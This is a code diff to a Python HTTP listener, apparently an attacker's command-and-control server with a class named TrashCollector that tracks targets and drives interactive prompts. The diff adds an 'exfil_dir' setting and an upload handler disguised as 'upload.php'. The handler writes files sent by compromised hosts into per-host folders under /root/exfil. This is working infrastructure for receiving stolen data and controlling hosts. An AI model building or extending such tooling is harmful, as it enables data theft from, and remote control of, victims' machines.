@@ -2,10 +2,17 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import ssl
 import urllib
+from urllib.parse import urlparse
+#from requests_toolbelt import MultipartDecoder
+import multipart
+import cgi
 import logging
 import json
 from io import BytesIO
 
+import shutil
+
+import traceback
 import asyncio
 import time
 import sys
@@ -24,6 +31,11 @@ from prompt_toolkit.patch_stdout import patch_stdout
 from colored import fg, bg, attr
 import shlex
 import pty
+
+
+SETTINGS = {
+"exfil_dir":"/root/exfil/"
+}
 
 targets = []
 
@@ -53,6 +65,7 @@ sess = PromptSession()
 
 curr_prompt = None
 
+
 class TrashCollector(BaseHTTPRequestHandler):
 
     def do_GET(self):
@@ -60,21 +73,84 @@ class TrashCollector(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b'Hello, world!')
 
+
+
+    def do_upload(self):
+        # Do some browsers /really/ use multipart ? maybe Opera ?
+        try:
+            #self.log_message("Started file transfer")
+                       
+            content_length = int(self.headers['Content-Length'])
+            body = self.rfile.read(content_length)
+            print("Downloading {} bytes...".format(content_length))
+            #print("Content Type: {}".format(self.headers.get_content_type()))
+            #print("Body: {}".format(body))
+            stream = BytesIO(body)
+            boundary = stream.readline()
+            boundary = boundary.strip(b"\r\n")[2:]
+            #print("Boundary: {}".format(boundary))
+            stream.seek(0)
+            parser = multipart.MultipartParser(stream, boundary)
+            #print("{}".format(parser))
+            
+            #print("Data:\n{}".format(parser.get('data').file.read()))
+            for part in parser:
+                host = self.get_host().replace(":", "_")
+                #print("Joining {}+{}+{}".format(SETTINGS['exfil_dir'], host , part.name))
+                localpath = os.path.join(SETTINGS['exfil_dir'], host, part.name.lstrip("/"))
+                #localpath = os.path.join(localpath , part.name) #.encode('utf-8')
+                #print("Initial path: {}".format(localpath))
+                root, ext = os.path.splitext(localpath)
+                i = 1
+
+                try:
+                    os.makedirs(os.path.dirname(localpath), 755)
+                except Exception as e:
+                    pass
+
+                # race condition, but hey...
+                while (os.path.exists(localpath)):
+                    localpath = "%s-%d%s" % (root, i, ext)
+                    i = i + 1
+                #print("Writing to: {}".format(localpath))
+                fout = open(localpath, 'wb')
+                shutil.copyfileobj(part.file, fout)
+                fout.close()
+
+                os.chmod(localpath, 755)
+                #self.log_message("Received: %s", os.path.basename(localpath))
+
+                #self.send_html(self.html("success"))
+                print("Downloaded: {}".format(localpath))
+
+        except Exception as e:
+            #self.log_message(repr(e))
+            print("Error downloading: {}".format(e))
+            traceback.print_exc()
+            #self.send_html(self.html("error"))
+
+    def get_host(self):
+        return self.headers["Host"].strip("\r\n")
+
+
     def do_POST(self):
         global target
         global curr_prompt
         global loop
 
+        if os.path.basename(urlparse(self.path).path) == "upload.php":
+            return self.do_upload()
+
         content_length = int(self.headers['Content-Length'])
         body = self.rfile.read(content_length)
         self.send_response(200)
         self.end_headers()
-
+        
         post_data = urllib.parse.parse_qs(body.decode('utf-8'))
         #logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
         #        str(self.path), str(self.headers), str(post_data))
 
-        host = self.headers["Host"].strip("\r\n")
+        host = self.get_host()
         logging.info("Host: {} Data: {}".format(host, post_data))
 
         old_prompt = get_prompt(target_info_all.get(host, None))
